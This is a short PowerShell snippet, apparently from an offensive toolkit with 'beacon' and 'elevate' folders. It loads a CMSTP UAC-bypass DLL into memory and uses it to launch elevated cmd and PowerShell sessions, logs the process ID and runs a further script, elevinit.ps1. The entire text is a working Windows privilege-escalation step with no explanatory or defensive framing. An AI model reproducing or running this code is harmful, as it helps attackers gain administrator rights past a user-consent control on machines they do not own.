[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\temp\beacon\elevate\CMSTP-UAC-Bypass.dll")) | Out-Null

[CMSTPBypass]::Execute(
    'C:\Windows\System32\cmd.exe /C 
    powershell -NoExit -Command "echo $PID > C:\temp\beacon\log2.txt; C:\temp\beacon\elevate\elevinit.ps1"'
    ) | Out-Null
